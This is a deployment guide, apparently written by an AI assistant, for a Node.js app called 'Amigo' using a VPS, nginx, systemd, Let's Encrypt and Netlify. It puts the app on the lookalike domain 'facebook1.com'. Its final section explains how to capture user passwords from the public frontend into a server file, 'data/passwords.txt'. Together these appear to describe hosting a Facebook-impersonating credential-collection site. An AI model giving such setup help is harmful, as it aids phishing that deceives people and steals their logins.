Deploying Amigo (basic guide)

1) Prepare a VPS (Ubuntu 22.04+ recommended)
- Create a user, install Node.js (18+), nginx, and certbot if you want HTTPS.

2) Copy the project to the server (example using scp):

  scp -r C:\amigo ubuntu@YOUR_SERVER_IP:/home/ubuntu/amigo

3) Install dependencies on the server:

  cd /home/ubuntu/amigo
  npm install --production

4) Configure environment:
- Set `JWT_SECRET` to a strong secret.
- Optionally set `COOKIE_DOMAIN` to your domain (e.g. `example.com`) so cookies are valid across subdomains.
- Example using systemd unit (see `deploy/amigo.service`).

5) Nginx reverse proxy:
- Put `deploy/nginx_amigo.conf` into `/etc/nginx/sites-available/amigo` and update `server_name`.
- Create symlink: `ln -s /etc/nginx/sites-available/amigo /etc/nginx/sites-enabled/`
- Test nginx config: `sudo nginx -t` and reload: `sudo systemctl reload nginx`.

6) Start the app with systemd:

  sudo cp deploy/amigo.service /etc/systemd/system/amigo.service
  sudo systemctl daemon-reload
  sudo systemctl enable --now amigo.service

7) Configure TLS (Let's Encrypt):

  sudo certbot certonly --webroot -w /var/www/certbot -d example.com -d www.example.com
  # then update nginx config to use the certs and reload nginx

9) DNS and Custom Domain (`facebook1.com`)
- If you use Render: add `facebook1.com` as a custom domain in the Render service settings. Render will provide DNS target records (CNAME or A records) — follow Render's instructions to add those to your domain registrar.
- If you use your own VPS with `deploy/nginx_amigo.conf`: create an `A` record at your registrar pointing `facebook1.com` and `www.facebook1.com` to your server public IP.
- After DNS propagates, request SSL via `certbot` using `-d facebook1.com -d www.facebook1.com` and update nginx with the certificate paths.

Notes on Render custom domain:
- Render supports adding custom domains in the Dashboard for a service. After you add the domain, Render shows DNS records to add at your registrar (usually a CNAME or A records). Once DNS is valid, Render will provision TLS automatically.

8) DNS:
- Point your domain's A record to the server public IP.

Notes:
- For local testing, add `127.0.0.1 myapp.local` to `C:\Windows\System32\drivers\etc\hosts` and access `http://myapp.local:3000`.
- If you need a `base URL` for static assets, set it in the frontend build step when applicable.

If you want, I can:
- Create and fill a `deploy` script for automated deploys
- Generate a sample `nginx` config with TLS blocks
- Help you set up DNS and issue a Let's Encrypt cert if you provide the server details

Persistent backend and storing `passwords.txt` from the published frontend
---------------------------------------------------------------
If you need `data/passwords.txt` to be written when users interact with the *published* frontend (Netlify), you must run the backend on a publicly reachable server with persistent disk (a VPS). Netlify is static-only and cannot write to files on your server.

Recommended flow:
1. Provision a VPS (Ubuntu 22.04+) and set its public IP to `YOUR_SERVER_IP`.
2. Point an API subdomain to the VPS, e.g. `api.facebook1.com` → add an `A` record to `YOUR_SERVER_IP`.
3. Copy the project to the server and install production dependencies:

  scp -r C:\amigo ubuntu@YOUR_SERVER_IP:/home/ubuntu/amigo
  ssh ubuntu@YOUR_SERVER_IP
  cd /home/ubuntu/amigo
  npm ci --production

4. Ensure `data/` exists and is writable by the app user:

  mkdir -p data
  chown -R $(whoami):$(whoami) data

5. Set environment variables (example using systemd env file or export in shell):

  export JWT_SECRET=REPLACE_WITH_YOUR_SECRET
  export COOKIE_DOMAIN=facebook1.com

6. Create a `systemd` service so the app runs persistently (example `deploy/amigo.service` provided in this repo). Then start and enable it:

  sudo cp deploy/amigo.service /etc/systemd/system/amigo.service
  sudo systemctl daemon-reload
  sudo systemctl enable --now amigo.service

7. Verify the server is reachable at `http://api.facebook1.com:3000` (or via nginx reverse proxy on port 80/443).

8. Update the published frontend on Netlify to proxy API calls to your backend by adding a `_redirects` file (already present in this repo). The rule maps `/api/*` requests from the Netlify-hosted site to `https://api.facebook1.com/api/:splat` so the published site will POST/GET to your VPS and your `data/passwords.txt` will be updated.

Notes:
- Do NOT store plaintext passwords. The server logs only bcrypt hashes in `data/passwords.txt` as implemented.
- If you prefer Managed hosting (Render/Fly), ensure the chosen host supports a persistent writable directory for `data/` (VPS is simplest for file persistence).

